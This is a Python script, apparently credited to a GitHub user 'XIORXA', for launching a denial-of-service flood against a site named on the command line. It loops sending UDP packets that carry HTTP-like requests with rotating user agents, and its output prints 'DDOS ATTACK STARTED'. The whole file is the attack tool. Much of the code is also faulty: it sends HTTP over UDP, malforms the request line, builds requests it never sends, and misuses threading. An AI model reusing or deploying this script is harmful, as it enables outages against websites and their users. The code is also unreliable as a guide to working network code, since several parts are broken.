#!/usr/bin/python3
# -*- coding: utf-8 -*-

import socket
import threading
import sys
import random
import urllib.request
"""
  _____ _   _ ____ _____ _     _____   ____  ____   ___  ____          _ 
 |_   _| | | |  _ \_   _| |   | ____| |  _ \|  _ \ / _ \/ ___|  __   _/ |
   | | | | | | |_) || | | |   |  _|   | | | | | | | | | \___ \  \ \ / / |
   | | | |_| |  _ < | | | |___| |___  | |_| | |_| | |_| |___) |  \ V /| |
   |_|  \___/|_| \_\|_| |_____|_____| |____/|____/ \___/|____/    \_/ |_|
   						    __________________
                                                   | creator : XIORXA |__________________
						   | github : https://github.com/xiorxa |
						   |____________________________________|
"""
ip = sys.argv[1]
uagent = [
    "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-N910V 4G Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1; X5 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Prism Build/HuaweiU8651) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; C811 4G Build/C811M070) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
    "Mozilla/5.0 (Linux; Android 5.1.1; LG-H345 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36",
    "Mozilla/5.0 (Android 6.0.1; Mobile; rv:47.0) Gecko/47.0 Firefox/47.0",
    "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.4; en-us; SAMSUNG SM-G900P Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.6 Chrome/28.0.1500.94 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Ubuntu 14.04 like Android 4.4) AppleWebKit/537.36 Chromium/35.0.1870.2 Mobile Safari/537.36",
    "Mozilla/5.0 (Mobile; LYF/LF-2403N/LYF-LF2403N-000-01-3B-010218;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0",
    "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; HTC_C525c Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
    "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36",
]
bots=[]
bots.append("http://validator.w3.org/check?uri=")
bots.append("http://www.facebook.com/sharer/sharer.php?u=")
bots.append("http://www.google.com/?q=")
bots.append("http://www.usatoday.com/search/results?q=")
bots.append("http://engadget.search.aol.com/search?q=")
bots.append("http://www.instagram.com")
bots.append("https://www.google.com/search?q=")
bots.append("https://check-host.net/check-http?host=")
bots.append("https://www.facebook.com/")
bots.append("https://www.youtube.com/")
bots.append("https://www.fbi.com/")
bots.append("https://www.bing.com/search?q=")
bots.append("https://r.search.yahoo.com/")
bots.append("https://www.cia.gov/index.html")
bots.append("https://vk.com/profile.php?redirect=")
bots.append("https://www.usatoday.com/search/results?q=")
bots.append("https://help.baidu.com/searchResult?keywords=")
bots.append("https://steamcommunity.com/market/search?q=")
bots.append("https://www.ted.com/search?q=")
bots.append("https://play.google.com/store/search?q=")

bots.append("http://"+ip+"/")

accpet = [
    	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept-Encoding: gzip, deflate\r\n",
	"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
	"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
	"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xhtml+xml",
	"Accept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
	"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
]

def dos():
    i = 0
    while True:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            p1 = "GET/ {} HTTP/1.1".format(ip).encode("utf-8")
            p2 = "User-Agent {}".format(random.choice(uagent)).encode("utf-8")
            p3 = "\r\n{}".format(accpet).encode("utf-8")
            pack = p1+p2+p3
            if s.sendto(pack,(ip,int(80))):
                print("-XIORXA DDOS ATTACK STARTED : {} -".format(i))
                i += 1
        except Exception as e:
            print("[-] ERROR : ",e)
            break
def bot(host):
    try:
        while True:
            url = "http://"+host
            req = urllib.request.Request(urllib.request.Request(url,headers={"User-Agent:":bots}))
            
    except:
        pass
    
def usage():
    print("----------------------")
    print("python3 main.py (site)")
    print("----------------------")

def main():
    if sys.argv[1] == "-h":
        usage()
        sys.exit()

    while True:
        try:
            t = threading.Thread(target=dos())
            t2 = threading.Thread(target=bot(host=ip))
            t.start()
            t2.start()
        except Exception as e:
            print("[-] ERROR : ",e)
            break


if __name__ == "__main__":
    main()
